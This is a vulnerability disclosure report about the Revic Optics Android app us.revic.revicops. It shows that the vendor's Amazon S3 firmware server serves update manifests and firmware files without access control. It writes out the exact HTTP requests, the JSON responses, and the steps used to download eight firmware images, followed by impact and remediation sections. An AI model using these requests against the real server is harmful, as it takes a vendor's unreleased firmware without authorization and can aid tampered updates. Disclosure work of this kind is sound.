# Vulnerability Report - us.revic.revicops- Incorrect Access Control

**Product:** `us.revic.revicops` 

**Vendor:** [Revic Optics](https://www.revicoptics.com/)

**Version:** 1.12.5

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `us.revic.revicops` , developed by **Revic Optics**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `str3` String value in the `UpdateActivity` class provides the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003195447185](https://s2.loli.net/2024/10/03/8ojxJPisQKq3pWG.png)

   ![image-20241003200037194](https://s2.loli.net/2024/10/03/8WK2CLkbqFwhsHe.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://s3-us-west-2.amazonaws.com/internalrelease/fw/firmware.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: s3-us-west-2.amazonaws.com
   Content-Length: 0
   Content-Type: text/plain
   
   ```

   ```http
   GET https://s3-us-west-2.amazonaws.com/externalrelease/fw/firmware.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: s3-us-west-2.amazonaws.com
   Content-Length: 0
   Content-Type: text/plain
   
   ```

   

   > Response:

   ```http
   HTTP/1.1 200 OK
   x-amz-id-2: Ryx26PSx+JrTv+oMywuNBvT/ZWetvFEdYr5X/NO5QCms34iJH/Uq/3ejSKDNVBzHd32g2vXqwRk=
   x-amz-request-id: CKK9N3MMTPH1N2KB
   Date: Thu, 03 Oct 2024 11:44:29 GMT
   Last-Modified: Tue, 13 Aug 2024 12:14:45 GMT
   ETag: "ebe47d79fb059fa7d65ed0bc62c68091"
   x-amz-server-side-encryption: AES256
   x-amz-version-id: wAo2s_yqVXT5I1kDSIeVZYBSj0scjWNp
   Accept-Ranges: bytes
   Content-Type: application/json
   Server: AmazonS3
   Content-Length: 1623
   
   [
     {
       "virgin" : "virgin.bin",
       "released" : "pmr_scope_fw2.bin",
       "temp" : "temp.bin",
       "selftest" : "self.bin",
       "android" : "previous.bin",
       "filename" : "pmr_scope_fw.bin",
       "dfu" : "RVC_BLE_DFU.zip",
       "version" : 6,
       "type" : "debug"
     },
     {
       "pmr"  : {
         "virgin" : "virgin.bin",
         "previous" : "pmr_scope_fw2.bin",
         "temp" : "temp.bin",
         "selftest" : "self.bin",
         "android" : "previous.bin",
         "filename" : "pmr_scope_fw.bin",
         "version" : 10
       },
   ......
   ```

   ```http
   HTTP/1.1 200 OK
   x-amz-id-2: iRfgdgVbcheGk1wWoQKij3vLfBH5gIFkw1aqhn/VNHew26iim8BD9ugDeTlZCa6GgcVUqdgBQVs=
   x-amz-request-id: M4XCJBF0AZSGQBWA
   Date: Thu, 03 Oct 2024 11:40:56 GMT
   Last-Modified: Fri, 03 May 2024 16:29:45 GMT
   ETag: "02d220ad4bf9ca352def4ece5fb5c70f"
   x-amz-server-side-encryption: AES256
   x-amz-version-id: IaaaTNykIIKvDI_1HljpOjS26ueL_KNu
   Accept-Ranges: bytes
   Content-Type: application/json
   Server: AmazonS3
   Content-Length: 754
   
   [
     {
       "filename": "pmr_scope_fw.bin",
       "version": 10
     },
     {
       "pmr"  : {
         "filename" : "pmr_scope_fw.bin",
         "version" : 10
       },
       "pmr2" : {
         "package" : "Gen2_OTA_2024_0325_0910_108_38_17.zip",
         "previous" : "Gen2_OTA_2023_0420_0955_18_11_5.zip",
         "filename" : "pmr2_scope_fw.bin",
         "fwVer" : 1,
         "batt" : "pmr2_batt_fw.bin",
         "battVer" : 1,
         "ble" : "pmr2_ble_dfu.zip",
         "bleVer" : 1,
         "version" : "G2.38.108.17"
       },
   ......
   ```

   And then, by combining the `filename, selftest, virgin` fields' value with the `baseurl` above, we could download the firmware directly.

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003195943228](https://s2.loli.net/2024/10/03/gYTHr7b39G61wxS.png)
   
   In total, we successfully downloaded **8 firmware** by exploiting the vulnerability.


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.